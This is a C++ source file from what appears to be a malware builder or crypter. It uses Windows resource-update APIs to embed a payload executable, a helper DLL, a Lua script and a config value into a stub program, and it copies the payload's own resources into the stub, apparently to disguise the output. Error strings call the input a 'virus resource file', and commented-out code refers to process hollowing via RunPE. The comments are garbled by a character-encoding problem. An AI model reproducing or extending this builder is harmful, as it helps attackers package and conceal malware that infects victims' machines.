#include "PEGenerator.h"



// ������Դ����
bool update_resource(CString str_path, HANDLE hUpdate, int rid) {

    bool flag = false;

    do {

        // ��Ҫ��ӵ���Դ���ļ� phdll
        std::ifstream phfile(str_path, std::ios::binary);
        if (!phfile.is_open()) {
            MessageBox(NULL, L"Failed to open the rc file.", str_path, MB_OK);
            break;
        }

        // ��ȡ�ļ����ݵ��ڴ� phdll
        phfile.seekg(0, std::ios::end);
        size_t phfileSize = phfile.tellg();
        phfile.seekg(0, std::ios::beg);

        char* buffer = new char[phfileSize];
        phfile.read(buffer, phfileSize);
        phfile.close();

        // ���ļ����ݸ��µ���Դ�� phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
            MessageBox(NULL, L"Failed to update the rc to resource.", str_path, MB_OK);
            delete[] buffer;
            break;
        }

        delete[] buffer;
        flag = true;
    } while (0);
    return flag;
}

bool update_config(int config, HANDLE hUpdate, int rid)
{
    bool flag = false;
    do {
        CStringA str_lua;
        str_lua.Format(R"(
            function getcfg()
                return %d
            end
        )", config);

        // ���ļ����ݸ��µ���Դ�� phdll
        if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(rid), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), str_lua.GetBuffer(), str_lua.GetLength())) {
            MessageBox(NULL, L"Failed to update the config lua to resource.", L"rc_config", MB_OK);
            str_lua.ReleaseBuffer();
            break;
        }
        str_lua.ReleaseBuffer();
        flag = true;
    } while (0);
    return flag;
}

// ����ļ�����Դ���µĿ�ִ���ļ�
BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
    WCHAR tempFilePath[MAX_PATH];

    // ������ʱ�ļ�·��
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // ����ʱ�ļ�������Դ����
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��Ҫ��ӵ���Դ���ļ�
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ�
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // ���ļ����ݸ��µ���Դ��
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;


    buffer = nullptr;

    // ��Ҫ��ӵ���Դ���ļ� phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ� phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // ���ļ����ݸ��µ���Դ�� phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }
    }

    update_config(config, hUpdate, IDR_CFG);

    do {
        // ����Ҫ������Դ���ļ�
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // ���������� resourceFilePath �е�������Դ���µĿ�ִ���ļ�
        ResourceUpdateData updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // �ͷ���Դģ��
        FreeLibrary(hResourceModule);
    } while (0);
    // �����Դ����
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        return FALSE;
    }

    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ɾ����ʱ�ļ�
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

BOOL CALLBACK EnumTypesProc(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc, lParam);
}

BOOL CALLBACK EnumNamesProc(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc, lParam);
}

BOOL CALLBACK EnumLangsProc(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData* updateData = (ResourceUpdateData*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

// ����ļ�����Դ���µĿ�ִ���ļ�
BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath, CString lua_path, int config) {
    WCHAR tempFilePath[MAX_PATH];

    // ������ʱ�ļ�·��
    GetTempPath(MAX_PATH, tempFilePath);
    GetTempFileName(tempFilePath, L"tmp", 0, tempFilePath);

    // ����ǰ��ִ���ļ����Ƶ���ʱ�ļ�
    if (!CopyFile(exePath, tempFilePath, FALSE)) {
        MessageBox(NULL, L"Failed to create temporary file.", L"generator", MB_OK);
        return FALSE;
    }

    // ����ʱ�ļ�������Դ����
    HANDLE hUpdate = BeginUpdateResource(tempFilePath, FALSE);
    if (!hUpdate) {
        MessageBox(NULL, L"Failed to open file for resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }
    // ��Ҫ��ӵ���Դ���ļ�
    std::ifstream file(resourceFilePath, std::ios::binary);
    if (!file.is_open()) {
        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ�
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    char* buffer = new char[fileSize];
    file.read(buffer, fileSize);
    file.close();

    // ���ļ����ݸ��µ���Դ��
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;
    buffer = nullptr;

    // ��Ҫ��ӵ���Դ���ļ� phdll
    std::ifstream phfile(L"PhDll.dll", std::ios::binary);
    if (!phfile.is_open()) {
        MessageBox(NULL, L"Failed to open the ph file.", L"generator", MB_OK);
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ��ȡ�ļ����ݵ��ڴ� phdll
    phfile.seekg(0, std::ios::end);
    size_t phfileSize = phfile.tellg();
    phfile.seekg(0, std::ios::beg);

    buffer = new char[phfileSize];
    phfile.read(buffer, phfileSize);
    phfile.close();

    // ���ļ����ݸ��µ���Դ�� phdll
    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_PH), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, phfileSize)) {
        MessageBox(NULL, L"Failed to update the phdll to resource.", L"generator", MB_OK);
        delete[] buffer;
        EndUpdateResource(hUpdate, TRUE);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    delete[] buffer;

    if (!lua_path.IsEmpty()) {
        if (!update_resource(lua_path, hUpdate, IDR_LUA)) {
            EndUpdateResource(hUpdate, TRUE);
            DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
            return FALSE;
        }
    }

    update_config(config, hUpdate, IDR_CFG);

    do {

        // ������Դ�ļ�
        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
        if (!hResourceModule) {
            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
            break;
        }

        // ���������� resourceFilePath �е�������Դ���µĿ�ִ���ļ�
        ResourceUpdateData32 updateData = { hUpdate };
        if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
            FreeLibrary(hResourceModule);
            break;
        }

        // �ͷ���Դģ��
        FreeLibrary(hResourceModule);
    } while (0);

    // �����Դ����
    if (!EndUpdateResource(hUpdate, FALSE)) {
        MessageBox(NULL, L"Failed to finalize resource update.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ���޸ĺ����ʱ�ļ����Ƶ�Ŀ���ļ�·��
    if (!CopyFile(tempFilePath, newExePath, FALSE)) {
        MessageBox(NULL, L"Failed to create the final output file.", L"generator", MB_OK);
        DeleteFile(tempFilePath); // ɾ����ʱ�ļ�
        return FALSE;
    }

    // ɾ����ʱ�ļ�
    DeleteFile(tempFilePath);

    MessageBox(NULL, L"Resource added successfully.", L"generator", MB_OK);
    return TRUE;
}

// ö����Դ����
BOOL CALLBACK EnumTypesProc32(HMODULE hModule, LPWSTR lpType, LONG_PTR lParam) {
    return EnumResourceNames(hModule, lpType, EnumNamesProc32, lParam);
}

// ö����Դ����
BOOL CALLBACK EnumNamesProc32(HMODULE hModule, LPCWSTR lpType, LPWSTR lpName, LONG_PTR lParam) {
    return EnumResourceLanguages(hModule, lpType, lpName, EnumLangsProc32, lParam);
}

// ö����Դ���Բ�������Դ
BOOL CALLBACK EnumLangsProc32(HMODULE hModule, LPCWSTR lpType, LPCWSTR lpName, WORD wLanguage, LONG_PTR lParam) {
    ResourceUpdateData32* updateData = (ResourceUpdateData32*)lParam;
    HRSRC hRes = FindResourceEx(hModule, lpType, lpName, wLanguage);
    if (!hRes) return TRUE;

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) return TRUE;

    DWORD resSize = SizeofResource(hModule, hRes);
    void* pResData = LockResource(hResData);

    if (!UpdateResource(updateData->hUpdate, lpType, lpName, wLanguage, pResData, resSize)) {
        std::cerr << "Failed to update resource." << std::endl;
        return FALSE;
    }
    return TRUE;
}

//// ���� Process Hollowing �ĸ����̺߳���
//DWORD WINAPI HollowingThread(LPVOID lpParam) {
//    HANDLE hMainThread = (HANDLE)lpParam;
//
//    // ��ͣ���߳�
//    if (SuspendThread(hMainThread) == -1) {
//        return 1;
//    }
//
//    RunPE();
//
//
//}
